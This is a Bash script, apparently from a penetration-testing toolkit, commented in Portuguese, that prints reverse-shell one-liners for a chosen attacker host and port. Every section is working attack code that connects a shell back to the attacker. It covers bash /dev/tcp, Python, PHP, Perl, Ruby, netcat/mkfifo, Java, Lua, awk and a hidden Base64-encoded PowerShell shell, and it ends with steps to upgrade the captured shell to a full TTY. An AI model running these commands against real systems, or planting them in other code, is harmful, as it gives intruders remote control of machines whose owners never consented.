#!/usr/bin/env bash
# V0rtexOS — Shell Generator / Cheatsheet
# Gera one-liners de shell reverso para qualquer plataforma
# Uso: shell-gen.sh <LHOST> <LPORT> [tipo]

LHOST="${1:?Informe LHOST}" LPORT="${2:?Informe LPORT}" TYPE="${3:-all}"

CYN='\033[1;36m' GRN='\033[1;32m' YEL='\033[1;33m' RST='\033[0m'
sec() { echo -e "\n${CYN}── $* ─────────────────────────────────${RST}"; }

header() {
    echo -e "\n${CYN}╔══════════════════════════════════════════════════╗"
    echo    "║  V0rtexOS — Reverse Shell Generator          ║"
    printf  "║  LHOST: %-15s | LPORT: %-14s║\n" "$LHOST" "$LPORT"
    echo -e "╚══════════════════════════════════════════════════╝${RST}\n"
}

print_shell() { local name="$1" cmd="$2"; echo -e "  ${GRN}[$name]${RST}\n  $cmd\n"; }

bash_shells() {
    sec "BASH"
    print_shell "bash -i" \
        "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
    print_shell "bash -196" \
        "0<&196;exec 196<>/dev/tcp/$LHOST/$LPORT; sh <&196 >&196 2>&196"
    print_shell "bash read" \
        "exec 5<>/dev/tcp/$LHOST/$LPORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"
    print_shell "bash URL-encoded" \
        "bash%20-i%20>%26%20/dev/tcp/$LHOST/$LPORT%200>%261"
}

python_shells() {
    sec "PYTHON"
    print_shell "python3 pty" \
        "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
    print_shell "python3 pty (short)" \
        "python3 -c 'import pty,socket,os;s=socket.socket();s.connect((\"$LHOST\",$LPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
    print_shell "python2" \
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"
}

php_shells() {
    sec "PHP"
    print_shell "php exec" \
        'php -r '"'"'$sock=fsockopen("'"$LHOST"'",'$LPORT');exec("/bin/sh -i <&3 >&3 2>&3");'"'"
    print_shell "php proc_open" \
        "php -r '\$sock=fsockopen(\"$LHOST\",$LPORT);\$proc=proc_open(\"/bin/sh -i\",array(0=>\$sock,1=>\$sock,2=>\$sock),\$pipes);'"
    print_shell "php system" \
        'php -r '"'"'$s=fsockopen("'"$LHOST"'",'$LPORT');while(!feof($s)){system(fgets($s));}'"'"
}

perl_shells() {
    sec "PERL"
    print_shell "perl" \
        "perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
}

ruby_shells() {
    sec "RUBY"
    print_shell "ruby" \
        "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$LHOST\",$LPORT);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
}

nc_shells() {
    sec "NETCAT"
    print_shell "nc (tradicional)" \
        "nc -e /bin/bash $LHOST $LPORT"
    print_shell "nc (sem -e, usando mkfifo)" \
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $LHOST $LPORT >/tmp/f"
    print_shell "nc OpenBSD" \
        "rm -f /tmp/f;mknod /tmp/f p;/bin/bash 0</tmp/f|nc $LHOST $LPORT 1>/tmp/f"
    print_shell "ncat" \
        "ncat $LHOST $LPORT -e /bin/bash"
}

powershell_shells() {
    sec "POWERSHELL (Windows)"
    print_shell "PS Base64" \
        "powershell -nop -noni -w hidden -e $(python3 -c "
import base64,sys
cmd = f'\$client = New-Object System.Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{{0}};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){{;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}}'
print(base64.b64encode(cmd.encode('utf-16-le')).decode())
" 2>/dev/null || echo 'python3 necessário para codificar')"
    print_shell "PS direto" \
        "\$c = New-Object System.Net.Sockets.TCPClient(\"$LHOST\",$LPORT);\$s = \$c.GetStream();[byte[]]\$b = 0..65535|%{0};while((\$i = \$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb = (iex \$d 2>&1|Out-String);\$sb2 = \$sb+\"PS \"+(pwd).Path+\"> \";\$bk = ([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$bk,0,\$bk.Length);\$s.Flush()}"
}

java_shells() {
    sec "JAVA"
    print_shell "Java Runtime" \
        'r = Runtime.getRuntime(); p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/'"$LHOST/$LPORT"';cat <&5 | while read line; do $line 2>&5 >&5; done"}); p.waitFor();'
}

lua_shells() {
    sec "LUA"
    print_shell "lua" \
        "lua -e \"require('socket');c=require('socket').tcp();c:connect('$LHOST',$LPORT);while true do local r,x=c:receive();local f=io.popen(r,'r');local b=f:read('*a');f:close();c:send(b);end;c:close();\""
}

awk_shells() {
    sec "AWK / GAWK (SUID abuse)"
    print_shell "awk" \
        "awk 'BEGIN {s = \"/inet/tcp/0/$LHOST/$LPORT\"; while(42) { do{ printf \"» \" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
}

upgrade_shell() {
    sec "UPGRADE PARA TTY INTERATIVO (após pegar shell)"
    echo -e "${YEL}  No alvo (após conexão):${RST}"
    echo "  python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
    echo "  python -c 'import pty;pty.spawn(\"/bin/bash\")'"
    echo "  script -qc /bin/bash /dev/null"
    echo "  CTRL+Z"
    echo -e "\n${YEL}  Na sua máquina (atacante):${RST}"
    echo "  stty raw -echo; fg"
    echo "  reset"
    echo "  export SHELL=bash TERM=xterm-256color"
    echo "  stty rows 50 columns 220"
    echo
    echo -e "${YEL}  Com pwncat-cs (automático):${RST}"
    echo "  pwncat-cs -lp $LPORT"
}

header

case "$TYPE" in
    bash)       bash_shells ;;
    python)     python_shells ;;
    php)        php_shells ;;
    perl)       perl_shells ;;
    ruby)       ruby_shells ;;
    nc)         nc_shells ;;
    ps)         powershell_shells ;;
    java)       java_shells ;;
    lua)        lua_shells ;;
    awk)        awk_shells ;;
    upgrade)    upgrade_shell ;;
    all)
        bash_shells; python_shells; php_shells; perl_shells; ruby_shells
        nc_shells; powershell_shells; java_shells; lua_shells; awk_shells
        upgrade_shell
        ;;
    *)
        echo "Tipos: bash python php perl ruby nc ps java lua awk upgrade all"
        ;;
esac
